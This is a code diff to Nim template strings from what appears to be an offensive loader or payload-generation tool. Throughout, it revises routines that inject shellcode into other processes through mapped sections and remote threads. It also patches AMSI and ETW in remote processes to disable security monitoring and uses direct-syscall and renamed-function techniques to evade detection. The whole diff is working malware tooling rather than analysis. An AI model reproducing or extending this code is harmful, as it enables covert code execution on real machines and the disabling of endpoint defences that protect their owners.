@@ -1,11 +1,6 @@
 let ShellcodeRemoteInjectMapSection * = """
 
-        when defined(DInvoke):
-            let tProcess2 = MyGetCurrentProcessId()
-            var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-        else:
-            let tProcess2 = GetCurrentProcessId()
-            var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+        var pHandle2: HANDLE = -1 # Current Process Handle
 
         var 
             oldProtection: DWORD = 0
@@ -52,12 +47,13 @@ let ShellcodeRemoteInjectMapSection * = """
             success = GetSyscallStub("NtMapViewOfSection", cast[LPVOID](syscallStub_NtMapViewOfSection))
         
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
 
-            when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), toHex(status)
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
-                        # NtCreateSection Call
+            # NtCreateSection Call
 
             var 
                 hMapFile: HANDLE
@@ -90,7 +86,7 @@ let ShellcodeRemoteInjectMapSection * = """
                 echo obf("")
             var lpMapAddressRemote: PVOID = NULL
             # NtMapViewOfSection Call remote
-            status = uihzasdbnqlpoasdlykxc(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            status = uihzasdbnqlpoasdlykxc(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
             
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
@@ -101,10 +97,10 @@ let ShellcodeRemoteInjectMapSection * = """
             ptrDecText = cast[ptr byte](lpMapAddress)
             decryptlate()
             
-            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,lpMapAddressRemote,NULL, FALSE, 0, 0, 0, NULL)
 
             status = zuatzuastdiasyy(tHandle)
-            status = zuatzuastdiasyy(pHandle)
+            status = zuatzuastdiasyy(tProcess)
 
             when defined(verbose):
                 echo success
@@ -115,10 +111,11 @@ let ShellcodeRemoteInjectMapSection * = """
                 else:
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
-        
-            status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
-            when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), toHex(status)
+            
+            when not defined(spawninject): # We already got a Handle, no need to open it again. Only for existing processes.
+                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
         
             when defined(Hellsgate):
                 if getSyscall(ntCreateSectionTable):
@@ -185,7 +182,7 @@ let ShellcodeRemoteInjectMapSection * = """
                         echo obf("[-] Failed to find opcode for NtMapViewOfSection")
 
             var lpMapAddressRemote: PVOID = NULL
-            status = NtMapViewOfSection(hMapFile,pHandle,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
+            status = NtMapViewOfSection(hMapFile,tProcess,&lpMapAddressRemote,0,0,NULL,&vSize,2,0,PAGE_EXECUTE_READ)
             
             if (lpMapAddressRemote == nil):
                 echo obf("[-] Failed to map view of file remote")
@@ -205,7 +202,7 @@ let ShellcodeRemoteInjectMapSection * = """
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
                 NULL, 
-                pHandle,
+                tProcess,
                 lpMapAddressRemote, 
                 NULL, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
@@ -214,27 +211,18 @@ let ShellcodeRemoteInjectMapSection * = """
     injectCreateRemoteThread(enctext) 
 
 when not defined(proxy):
-    when not defined(service):
-        when not defined(cloned):
-            discard main(nil)
-
-when defined(defaultMain):
-    when not defined(service):
-        when not defined(cloned):
-            discard main(nil)
+    when defined(defaultMain):
+        when not defined(service):
+            when not defined(cloned):
+                discard main(nil)
 
 """
 
 
 let ShellcoderemoteinjectStub * = """
     
-        when defined(DInvoke):
-            let tProcess2 = MyGetCurrentProcessId()
-            var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-        else:
-            let tProcess2 = GetCurrentProcessId()
-            var pHandle2: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-
+        var pHandle2: HANDLE = -1 # Current Process Handle
+        
         var 
             oldProtection: DWORD = 0
             status: NTSTATUS
@@ -277,29 +265,30 @@ let ShellcoderemoteinjectStub * = """
         ptrDecText = cast[ptr byte](addr decText[0])
         decryptlate()
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
 
-            when defined(verbose):
-                echo obf("[*] opqiwepoausdasdjl: "), status
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
-            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] opqiwepoausdasdjl: "), status
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
 
-            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
             when defined(verbose):
-                echo obf("[*] oqiazasusjk: "), status
+                echo obf("[*] NtWriteProcessMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
             #ptrEncText = cast[ptr byte](ds)
             #ptrDecText = cast[ptr byte](ds)
             #decryptlate()
-            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,ds,NULL, FALSE, 0, 0, 0, NULL)
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,ds,NULL, FALSE, 0, 0, 0, NULL)
 
             status = zuatzuastdiasyy(tHandle)
-            status = zuatzuastdiasyy(pHandle)
+            status = zuatzuastdiasyy(tProcess)
 
             when defined(verbose):
                 echo success
@@ -312,9 +301,10 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
         
-            status = NtOpenProcess(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
-            when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), status
+            when not defined(spawninject):
+                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), status
         
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -323,9 +313,9 @@ let ShellcoderemoteinjectStub * = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
-            status = NtAllocateVirtualMemory(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            status = NtAllocateVirtualMemory(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), status
+                echo obf("[*] NtAllocateVirtualMemory: "), status
             var bytesWritten: SIZE_T
 
             when defined(Hellsgate):
@@ -336,7 +326,7 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
             status = NtWriteVirtualMemory(
-                pHandle, 
+                tProcess, 
                 ds, 
                 unsafeAddr friendlycode, 
                 sc_size-1, 
@@ -360,7 +350,7 @@ let ShellcoderemoteinjectStub * = """
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
                 NULL, 
-                pHandle,
+                tProcess,
                 ds, 
                 NULL, FALSE, 0, 0, 0, NULL)
         
@@ -372,7 +362,7 @@ let ShellcoderemoteinjectStub * = """
                         echo obf("[-] Failed to find opcode for NtClose")
 
             status = NtClose(tHandle)
-            status = NtClose(pHandle)
+            status = NtClose(tProcess)
 
             when defined(verbose):
                 echo success
@@ -381,8 +371,11 @@ let ShellcoderemoteinjectStub * = """
     injectCreateRemoteThread(dectext) # later on to be changed to enctext when decrypting after NtWriteVirtualMemory
 
 when not defined(proxy):
-    when not defined(service):
-        discard main(nil)
+    when defined(defaultMain):
+        when not defined(service):
+            when not defined(cloned):
+                discard main(nil)
+
 """
 
 let ShellcoderemoteinjectStub_notepad * = """
@@ -391,7 +384,8 @@ let ShellcoderemoteinjectStub_notepad * = """
 
         var cid: CLIENT_ID
         var oa: OBJECT_ATTRIBUTES
-        var pHandle: HANDLE
+        when not defined(spawninject):
+            var tProcess: HANDLE
         var tHandle: HANDLE
         var ds: LPVOID
         var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
@@ -444,7 +438,8 @@ let ShellcoderemoteinjectStub_customprocthird * = """
 
         var cid: CLIENT_ID
         var oa: OBJECT_ATTRIBUTES
-        var pHandle: HANDLE
+        when not defined(spawninject):
+            var tProcess: HANDLE
         var tHandle: HANDLE
         var ds: LPVOID
         var sc_size: SIZE_T = cast[SIZE_T](friendlycode.len)
@@ -603,49 +598,40 @@ let RemotePatchAMSIStub* = """
 
     when isMainModule:
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&hProcams,PROCESS_ALL_ACCESS,&oa, &cid)
-        #[
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
         
-        when defined(GetSyscallStub):
-            when defined(DInvoke):
-                MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-                
-                MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
-                let syscallStub_NtOpenP2 = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            else:
-                let syscallStub_NtOpenP2 = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
-            var oldProtection: DWORD = 0
-            # define NtOpenProcess
-            var NtOpenProcess: myNtOpenProcess = cast[myNtOpenProcess](cast[LPVOID](syscallStub_NtOpenP2))
-            VirtualProtect(cast[LPVOID](syscallStub_NtOpenP2), SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, addr oldProtection);
-            success = GetSyscallStub("NtOpenProcess", cast[LPVOID](syscallStub_NtOpenP2))
-        ]#
         else:
-            when defined(Hellsgate):
-                if getSyscall(ntOpenTable):
-                    syscall = ntOpenTable.wSysCall
-                else:
-                    when defined(verbose):
-                        echo obf("[-] Failed to find opcode for NtOpenProcess")
+            when not defined(spawninject):
+                when defined(Hellsgate):
+                    if getSyscall(ntOpenTable):
+                        syscall = ntOpenTable.wSysCall
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to find opcode for NtOpenProcess")
 
-            status = NtOpenProcess(
-                &hProcams,
-                PROCESS_ALL_ACCESS, 
-                &oa, &cid         
-            )
-        when defined(verbose):
-            echo obf("[*] NtOpenProcess: "), toHex(status)
-        #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+                status = NtOpenProcess(
+                    &hProcss,
+                    PROCESS_ALL_ACCESS, 
+                    &oa, &cid         
+                )
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
+        
+        when not defined(spawninject):
+            var procHandle2: HANDLE = hProcss
+        else:
+            var procHandle2: HANDLE = tProcess
 
-        success = RemotePatchAmsi(hProcams)
+        success = RemotePatchAmsi(procHandle2)
         if (success == 0):
             success = remoteLoadAmsi(remoteProcID)
             HowMuchTimeWouldYoulikeToSleep(2)
-            success = RemotePatchAmsi(hProcams)
+            success = RemotePatchAmsi(procHandle2)
         when defined(verbose):
             echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
 
-amsRemote()
+    #amsRemote()
 
 """
 
@@ -664,7 +650,8 @@ let RemoteLoadAMSIStub* = """
             echo obf("[*] Loading amsi.dll in the remote process: "), processID
         var cid: CLIENT_ID
         var oa: OBJECT_ATTRIBUTES
-        var pHandle: HANDLE
+        when not defined(spawninject):
+            var tProcess: HANDLE
         var tHandle: HANDLE
         var ds: LPVOID
         var status: NTSTATUS
@@ -673,27 +660,27 @@ let RemoteLoadAMSIStub* = """
         cid.UniqueProcess = processID
 
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
 
-            when defined(verbose):
-                echo obf("[*] opqiwepoausdasdjl: "), status
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
-            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] oqiahsjynmxkla: "), status
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
 
-            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
             when defined(verbose):
-                echo obf("[*] oqiazasusjk: "), status
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
 
             var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
             status = zuatzuastdiasyy(tHandle)
-            status = zuatzuastdiasyy(pHandle)
             if(status == 0):
                 return true
             else:
@@ -702,16 +689,11 @@ let RemoteLoadAMSIStub* = """
 
             when defined(GetSyscallStub):
                 when defined(DInvoke):
-                    let tProcess2 = MyGetCurrentProcessId()
-                    MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-                    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-
+                    var pHandle2: HANDLE = -1
                     MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                     let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                 else:
-                    let tProcess2 = GetCurrentProcessId()
-                    let pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-
+                    let pHandle2 = -1
                     let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
 
         
@@ -752,13 +734,10 @@ let RemoteLoadAMSIStub* = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
 
-            status = NtOpenProcess(
-                &pHandle,
-                PROCESS_ALL_ACCESS, 
-                &oa, &cid         
-            )
-            when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), toHex(status)
+            when not defined(spawninject):
+                status = NtOpenProcess(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -768,7 +747,7 @@ let RemoteLoadAMSIStub* = """
                         echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
             status = NtAllocateVirtualMemory(
-                pHandle, &ds, 0, &sc_size, 
+                tProcess, &ds, 0, &sc_size, 
                 MEM_COMMIT, 
                 PAGE_EXECUTE_READWRITE)
             when defined(verbose):
@@ -783,7 +762,7 @@ let RemoteLoadAMSIStub* = """
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
             status = NtWriteVirtualMemory(
-                pHandle, 
+                tProcess, 
                 ds, 
                 unsafeAddr friendlycode, 
                 sc_size-1, 
@@ -810,14 +789,13 @@ let RemoteLoadAMSIStub* = """
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
                 NULL, 
-                pHandle,
+                tProcess,
                 pfnThreadRtn, 
                 ds, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
                 echo obf("[*] NtCreateThreadEx: "), toHex(status)
             status = NtClose(tHandle)
-            status = NtClose(pHandle)
-
+            
             if(status == 0):
                 return true
             else:
@@ -838,6 +816,7 @@ let RemoteLoadAMSIStub* = """
 
 
 let RemotePatchETWStub* = """
+
 
     proc RemotePatchETW(hProcss :HANDLE): bool =
 
@@ -873,7 +852,7 @@ let RemotePatchETWStub* = """
             buffer          : LPVOID
 
         when defined(SysWhispers):
-            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x04,addr t)
+            status = uashdiasdj(hProcss, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                     
             if not NT_SUCCESS(status):
                 when defined(verbose):
@@ -892,7 +871,7 @@ let RemotePatchETWStub* = """
                     echo obf("[-] Failed to write memory.")
             else:
                 when defined(verbose):
-                    echo obf("[+] oqiazasusjk Succeed!")
+                    echo obf("[+] NtWriteVirtualMemory Succeed!")
                     
             status = uashdiasdj(hProcss,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                     
@@ -983,12 +962,14 @@ let RemotePatchETWStub* = """
 
     when isMainModule:
         var cid: CLIENT_ID
-        var hProcams: HANDLE
+        when not defined(spawninject):
+            var hProcss: HANDLE
         var status: NTSTATUS
         cid.UniqueProcess = remoteProcID
         var oa: OBJECT_ATTRIBUTES
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&hProcams,PROCESS_ALL_ACCESS,&oa, &cid)
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&hProcss,PROCESS_ALL_ACCESS,&oa, &cid)
         else:
             when defined(GetSyscallStub):
                 when defined(DInvoke):
@@ -1011,20 +992,25 @@ let RemotePatchETWStub* = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
 
-            status = NtOpenProcess(
-                &hProcams,
-                PROCESS_ALL_ACCESS, 
-                &oa, &cid         
-            )
-        when defined(verbose):
-            echo obf("[*] NtOpenProcess: "), toHex(status)
+            when not defined(spawninject):
+                status = NtOpenProcess(
+                    &hProcss,
+                    PROCESS_ALL_ACCESS, 
+                    &oa, &cid         
+                )
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
         
-        #var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
-        success = RemotePatchETW(hProcams)
+        when not defined(spawninject):
+            var procHandle: HANDLE = hProcss
+        else:
+            var procHandle: HANDLE = tProcess
+
+        success = RemotePatchETW(procHandle)
         if (success == 0):
             success = remoteLoadNtdll(remoteProcID)
             HowMuchTimeWouldYoulikeToSleep(2)
-            success = RemotePatchETW(hProcams)
+            success = RemotePatchETW(procHandle)
         when defined(verbose):
             echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
 
@@ -1047,7 +1033,8 @@ let RemoteLoadNTDLLStub* = """
             echo obf("[*] Loading ntdll.dll in the remote process: "), processID
         var cid: CLIENT_ID
         var oa: OBJECT_ATTRIBUTES
-        var pHandle: HANDLE
+        when not defined(spawninject):
+            var tProcess: HANDLE
         var tHandle: HANDLE
         var ds: LPVOID
         var status: NTSTATUS
@@ -1056,27 +1043,27 @@ let RemoteLoadNTDLLStub* = """
         cid.UniqueProcess = processID
 
         when defined(SysWhispers):
-            status = opqiwepoausdasdjl(&pHandle,PROCESS_ALL_ACCESS,&oa, &cid)
+            when not defined(spawninject):
+                status = opqiwepoausdasdjl(&tProcess,PROCESS_ALL_ACCESS,&oa, &cid)
 
-            when defined(verbose):
-                echo obf("[*] opqiwepoausdasdjl: "), status
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
-            status = oqiahsjynmxkla(pHandle, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
+            status = oqiahsjynmxkla(tProcess, &ds, 0, &sc_size,MEM_COMMIT,PAGE_EXECUTE_READWRITE)
             when defined(verbose):
-                echo obf("[*] oqiahsjynmxkla: "), status
+                echo obf("[*] NtAllocateVirtualMemory: "), toHex(status)
             var bytesWritten: SIZE_T
 
-            status = oqiazasusjk(pHandle,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
+            status = oqiazasusjk(tProcess,ds,unsafeAddr friendlycode,sc_size-1,addr bytesWritten)
 
             when defined(verbose):
-                echo obf("[*] oqiazasusjk: "), status
+                echo obf("[*] NtWriteVirtualMemory: "), toHex(status)
                 echo obf("    \\-- bytes written: "), bytesWritten
                 echo obf("")
 
             var pfnThreadRtn: LPTHREAD_START_ROUTINE = cast[LPTHREAD_START_ROUTINE](GetProcAddress(GetModuleHandle("Kernel32.dll"), "LoadLibraryA"));
-            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
+            status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,tProcess,pfnThreadRtn,ds, FALSE, 0, 0, 0, NULL)
             status = zuatzuastdiasyy(tHandle)
-            status = zuatzuastdiasyy(pHandle)
             if(status == 0):
                 return true
             else:
@@ -1085,16 +1072,13 @@ let RemoteLoadNTDLLStub* = """
 
             when defined(GetSyscallStub):
                 when defined(DInvoke):
-                    let tProcess2 = MyGetCurrentProcessId()
                     MyOpenProcess = cast[OpenProcess_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), OpenProcess_HASH, 0, FALSE)))
-                    var pHandle2: HANDLE = MyOpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
+                    var pHandle2: HANDLE = -1
 
                     MyVirtualAllocEx = cast[VirtualAllocEx_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), VirtualAllocEx_HASH, 0, FALSE))
                     let syscallStub_NtOpenP = MyVirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
                 else:
-                    let tProcess2 = GetCurrentProcessId()
-                    let pHandle2 = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess2)
-
+                    let pHandle2 = -1
                     let syscallStub_NtOpenP = VirtualAllocEx(pHandle2,NULL,cast[SIZE_T](SYSCALL_STUB_SIZE),MEM_COMMIT,PAGE_EXECUTE_READ_WRITE)
 
         
@@ -1135,13 +1119,14 @@ let RemoteLoadNTDLLStub* = """
                     when defined(verbose):
                         echo obf("[-] Failed to find opcode for NtOpenProcess")
 
-            status = NtOpenProcess(
-                &pHandle,
-                PROCESS_ALL_ACCESS, 
-                &oa, &cid         
-            )
-            when defined(verbose):
-                echo obf("[*] NtOpenProcess: "), toHex(status)
+            when not defined(spawninject):
+                status = NtOpenProcess(
+                    &tProcess,
+                    PROCESS_ALL_ACCESS, 
+                    &oa, &cid         
+                )
+                when defined(verbose):
+                    echo obf("[*] NtOpenProcess: "), toHex(status)
 
             when defined(Hellsgate):
                 if getSyscall(ntAllocTable):
@@ -1151,7 +1136,7 @@ let RemoteLoadNTDLLStub* = """
                         echo obf("[-] Failed to find opcode for NtAllocateVirtualMemory")
 
             status = NtAllocateVirtualMemory(
-                pHandle, &ds, 0, &sc_size, 
+                tProcess, &ds, 0, &sc_size, 
                 MEM_COMMIT, 
                 PAGE_EXECUTE_READWRITE)
             when defined(verbose):
@@ -1166,7 +1151,7 @@ let RemoteLoadNTDLLStub* = """
                         echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
 
             status = NtWriteVirtualMemory(
-                pHandle, 
+                tProcess, 
                 ds, 
                 unsafeAddr friendlycode, 
                 sc_size-1, 
@@ -1192,13 +1177,12 @@ let RemoteLoadNTDLLStub* = """
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
                 NULL, 
-                pHandle,
+                tProcess,
                 pfnThreadRtn, 
                 ds, FALSE, 0, 0, 0, NULL)
             when defined(verbose):
                 echo obf("[*] NtCreateThreadEx: "), toHex(status)
             status = NtClose(tHandle)
-            status = NtClose(pHandle)
 
             if(status == 0):
                 return true
